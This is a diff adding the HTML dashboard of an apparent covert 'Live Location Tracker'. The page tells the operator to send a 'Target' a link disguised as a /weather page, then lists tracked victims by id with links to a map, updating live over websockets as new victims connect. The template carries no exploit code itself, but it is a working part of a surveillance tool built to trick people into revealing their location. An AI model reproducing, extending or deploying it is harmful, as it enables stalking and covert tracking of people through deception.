@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Home</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/1.0.2/css/bulma.min.css">
+</head>
+
+<body>
+    <header class="has-background-black p-3 has-text-centered">
+        <h1 class="title is-4 mb-2">Live Location Tracker</h1>
+        <a href="http://madhanmaaz.netlify.app/" class="is-block mb-2">Created by madhanmaaz</a>
+        <p class="is-block">Send to Target: <code>{{ global.remoteURL }}/weather</code></p>
+    </header>
+
+    <section id="tar-content" class="container is-widescreen p-2 is-flex is-flex-direction-column is-gap-1">
+        <h1 class="title is-5">Targets</h1>
+
+        {{ for(value, key in TARGETS) }}
+        <a href="/map?id={{ key }}" class="button is-fullwidth">
+            {{ key }}
+        </a>
+        {{/}}
+    </section>
+
+    <script src="https://cdn.jsdelivr.net/npm/socket.io@4.8.1/client-dist/socket.io.min.js"></script>
+    <script>
+        const content = document.querySelector("#tar-content")
+        const socket = io("", {
+            secure: true,
+            path: "/socket.io",
+            transports: ['websocket']
+        })
+
+        socket.on("user-connected", newId => {
+            const a = document.createElement('a')
+            a.href = `/map?id=${newId}`
+            a.className = "button is-fullwidth"
+            a.innerText = newId
+            content.appendChild(a)
+        })
+    </script>
+</body>
+
+</html>
